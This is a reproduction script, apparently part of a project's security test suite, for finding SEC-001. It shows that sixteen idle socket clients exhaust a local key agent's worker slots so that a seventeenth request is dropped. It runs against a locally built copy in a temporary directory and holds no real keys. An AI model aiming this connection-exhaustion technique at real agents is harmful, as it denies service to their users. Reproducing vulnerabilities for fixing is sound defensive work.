#!/usr/bin/env node
// Exit 0: not reproduced; 1: vulnerability reproduced; 2: setup/runtime error.
import assert, { AssertionError } from 'node:assert/strict';
import { spawn, execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync } from 'node:fs';
import { Socket } from 'node:net';
import { join, resolve } from 'node:path';
import { setTimeout as delay } from 'node:timers/promises';

const repository = resolve(import.meta.dirname, '../..');
const expected = Buffer.from('000000050c00000000', 'hex');

async function main() {
  if (process.platform !== 'darwin') throw new Error('SEC-001 requires macOS');
  const build = execFileSync('cargo', [
    'build', '--locked', '--offline', '-p', 'seccy_cli',
    '--bin', 'seccy', '--message-format=json',
  ], { cwd: repository, encoding: 'utf8', stdio: ['ignore', 'pipe', 'inherit'] });
  const artifact = build.trim().split('\n').map(line => JSON.parse(line)).find(item =>
    item.reason === 'compiler-artifact' && item.target.name === 'seccy' && item.executable);
  if (!artifact) throw new Error('cargo did not report the seccy executable');

  // Short, isolated paths avoid Darwin's socket path limit. No real keys are used.
  const temporary = mkdtempSync('/tmp/sec001-');
  const sockets = new Set<Socket>();
  const agent = spawn(artifact.executable, [
    'agent', '--json',
  ], {
    cwd: temporary,
    env: {
      ...process.env, HOME: temporary, XDG_STATE_HOME: join(temporary, 'state'),
      XDG_CONFIG_HOME: join(temporary, 'config'),
      XDG_DATA_HOME: join(temporary, 'data'), XDG_RUNTIME_DIR: temporary, LOG_LEVEL: 'off',
    },
    stdio: ['ignore', 'pipe', 'inherit'],
  });
  const exited = new Promise<void>(resolve => agent.once('close', () => resolve()));
  try {
    const ready = await new Promise<{ ok: boolean; event: string; socket: string }>((resolve, reject) => {
      let output = '';
      const timer = setTimeout(() => reject(new Error('agent startup timed out')), 15_000);
      const finish = () => clearTimeout(timer);
      agent.once('error', error => { finish(); reject(error); });
      agent.once('exit', () => { finish(); reject(new Error('agent exited before readiness')); });
      agent.stdout.on('data', (chunk: Buffer) => {
        output += chunk.toString();
        if (!output.includes('\n')) return;
        finish();
        try { resolve(JSON.parse(output.slice(0, output.indexOf('\n')))); }
        catch (error) { reject(error); }
      });
    });
    if (!ready.ok || ready.event !== 'ready' || !ready.socket) {
      throw new Error(`agent startup failed: ${JSON.stringify(ready)}`);
    }

    function close(socket: Socket) {
      socket.destroy();
      sockets.delete(socket);
    }

    // Resolve after a complete empty-inventory response or EOF/reset. Leave a
    // successful socket open so its admitted worker remains occupied and idle.
    function request(): Promise<{ socket: Socket; response: Buffer }> {
      return new Promise((resolve, reject) => {
        const socket = new Socket();
        sockets.add(socket);
        let response = Buffer.alloc(0);
        let settled = false;
        const timer = setTimeout(() => finish(new Error('identity request timed out')), 5_000);
        function finish(error?: Error) {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          if (error) { close(socket); reject(error); }
          else resolve({ socket, response });
        }
        socket.on('data', chunk => {
          if (settled) return;
          response = Buffer.concat([response, typeof chunk === 'string' ? Buffer.from(chunk) : chunk]);
          if (response.length >= expected.length) finish();
        });
        socket.once('end', () => finish());
        socket.on('error', (error: NodeJS.ErrnoException) => {
          if (error.code === 'ECONNRESET' || error.code === 'EPIPE') finish();
          else finish(error);
        });
        socket.connect(ready.socket, () => socket.write(Buffer.from('000000010b', 'hex')));
      });
    }

    // Handshakes establish admission deterministically before leaving workers idle.
    for (let index = 0; index < 16; index++) {
      const { response } = await request();
      assert(response.length > 0, `only ${index} connections admitted`);
      if (!response.equals(expected)) throw new Error('expected an empty registry; refusing to continue');
      if (index === 0) console.log(`baseline: ${response.toString('hex')}`);
    }
    const victim = await request();
    assert.equal(victim.response.length, 0, '17th connection was not dropped');
    console.log('17th connection: EOF/reset');

    for (const socket of sockets) close(socket);
    // Require recovery, so an agent crash is not reported as a reproduction.
    const deadline = performance.now() + 10_000;
    while (true) {
      const recovered = await request();
      close(recovered.socket);
      if (recovered.response.equals(expected)) {
        console.log(`after release: ${recovered.response.toString('hex')}`);
        break;
      }
      if (recovered.response.length) throw new Error('unexpected recovery response');
      if (performance.now() >= deadline) throw new Error('agent did not recover after releasing slots');
      await delay(50);
    }
    console.log('REPRODUCED SEC-001: 16 idle clients exclude a new request');
  } finally {
    for (const socket of sockets) socket.destroy();
    if (agent.exitCode === null && agent.signalCode === null) agent.kill('SIGTERM');
    const forceKill = setTimeout(() => agent.kill('SIGKILL'), 5_000);
    await exited;
    clearTimeout(forceKill);
    rmSync(temporary, { recursive: true, force: true });
  }
}

try {
  await main();
  process.exitCode = 1;
} catch (error) {
  const notReproduced = error instanceof AssertionError;
  console.error(`${notReproduced ? 'NOT REPRODUCED' : 'ERROR'} SEC-001:`, error instanceof Error ? error.message : error);
  process.exitCode = notReproduced ? 0 : 2;
}
